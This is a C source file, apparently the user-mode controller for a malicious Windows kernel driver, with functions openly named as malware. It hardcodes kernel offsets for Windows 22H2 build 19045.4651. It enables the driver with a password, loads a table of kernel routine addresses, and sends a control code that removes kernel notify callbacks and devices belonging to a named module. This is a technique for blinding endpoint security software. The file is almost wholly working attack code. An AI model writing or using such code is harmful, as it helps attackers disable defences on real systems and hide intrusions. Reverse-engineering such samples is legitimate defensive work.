#include "main.h"

// Windows 22H2 19045.4651
api_mapping_t api_mapping = {
    .length = 25,
    .array = {
        [0] = {.rva = 0xcec620, .name = "PspLoadImageNotifyRoutine"},
        [1] = {.rva = 0xcec220, .name = "PspCreateThreadNotifyRoutine"},
        [2] = {.rva = 0xcec420, .name = "PspCreateProcessNotifyRoutine"},
        [3] = {.rva = 0xc484d0, .name = "CallbackListHead"},
        [4] = {.rva = 0x796eb8, .name = "PspSetCreateProcessNotifyRoutine"},
        [5] = {.rva = 0x6c0590, .name = "PspTerminateThreadByPointer"},
        [6] = {.rva = 0x7105f8, .name = "PsTerminateProcess"},
        [7] = {.rva = 0x338e50, .name = "IopInvalidDeviceRequest"},
        [8] = {.rva = 0xa1d0, .name = "ClassGlobalDispatch"},
        [9] = {.rva = 0x9070, .name = "NtfsFsdRead"},
        [10] = {.rva = 0x1af50, .name = "NtfsFsdWrite"},
        [11] = {.rva = 0x4a460, .name = "NtfsFsdLockControl"},
        [12] = {.rva = 0xe1b30, .name = "NtfsFsdDirectoryControl"},
        [13] = {.rva = 0xeaf50, .name = "NtfsFsdClose"},
        [14] = {.rva = 0xeb8f0, .name = "NtfsFsdCleanup"},
        [15] = {.rva = 0xebd90, .name = "NtfsFsdCreate"},
        [16] = {.rva = 0xece50, .name = "NtfsFsdDispatchWait"},
        [17] = {.rva = 0xeceb0, .name = "NtfsFsdDispatchSwitch"},
        [18] = {.rva = 0x151b50, .name = "NtfsFsdDispatch"},
        [19] = {.rva = 0x1544a0, .name = "NtfsFsdFlushBuffers"},
        [20] = {.rva = 0x10dd40, .name = "NtfsFsdDeviceControl"},
        [21] = {.rva = 0x10dec0, .name = "NtfsFsdFileSystemControl"},
        [22] = {.rva = 0x120940, .name = "NtfsFsdSetInformation"},
        [23] = {.rva = 0x162c70, .name = "NtfsFsdPnp"},
        [24] = {.rva = 0x250060, .name = "NtfsFsdShutdown"},
    }};

uint32_t
open_device(HANDLE *device)
{
    if (!device)
        return ERROR_INVALID_PARAMETER;

    HANDLE handle = CreateFileA(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (INVALID_HANDLE_VALUE == handle)
        return GetLastError();

    *device = handle;
    return 0;
}

uint32_t send_ioctrl(HANDLE device, uint32_t io_ctrl_code, void *input, uint32_t input_size, void *output, uint32_t output_size)
{
    if (INVALID_HANDLE_VALUE == device)
        return ERROR_INVALID_PARAMETER;

    uint32_t n_bytes = 0;
    if (!DeviceIoControl(device, io_ctrl_code, input, input_size, output, output_size, &n_bytes, NULL))
        return GetLastError();

    return 0;
}

uint32_t malware_enable(HANDLE device)
{
    return send_ioctrl(device, IOCTRL_ENABLE, PASSWORD, sizeof PASSWORD, NULL, 0);
}

uint32_t malware_load_api(HANDLE device)
{
    return send_ioctrl(device, IOCTRL_LOAD_API, &api_mapping, sizeof(api_mapping_t), NULL, 0);
}

uint32_t malware_remove_callbacks_and_devices_by_module_name(HANDLE device, wchar_t *target_module, bool remove_or_patch, bool remove_devices)
{
    ioctrl_0x222400_msg_t message = {
        .target_module = target_module,
        .remove_or_patch = remove_or_patch,
        .padding_0 = 0x41,
        .remove_devices = remove_devices,
        .padding_1 = "AAAAA"};

    return send_ioctrl(device, IOCTRL_REMOVE_CALLBACKS_AND_DEVICES_BY_MODULE_NAME, &message, sizeof message, NULL, 0);
}

uint32_t main(uint32_t argc, const char **argv)
{
    uint32_t result = 0;

    HANDLE device = INVALID_HANDLE_VALUE;
    if (result = open_device(&device))
    {
        printf("[-] Failed to open malware device, code = %d\n", result);
        goto end;
    }
    printf("[+] Malware device opened, %p\n", device);

    if (result = malware_enable(device))
    {
        printf("[-] Failed to enable malware, code = %d\n", result);
        goto end;
    }
    puts("[+] Malware successfully enabled");

    if (result = malware_load_api(device))
    {
        printf("[-] Failed to load malware api, code = %d\n", result);
        goto end;
    }
    puts("[+] Malware api successfully loaded");

    if (result = malware_remove_callbacks_and_devices_by_module_name(device, L"ahcache.sys", true, true))
    {
        printf("[-] Failed to remove callbacks and devices by module name, code = %d\n", result);
        goto end;
    }
    puts("[+] Malware successfully removed callbacks and devices by module name");

end:
    if (INVALID_HANDLE_VALUE != device)
        CloseHandle(device);
    return result;
}
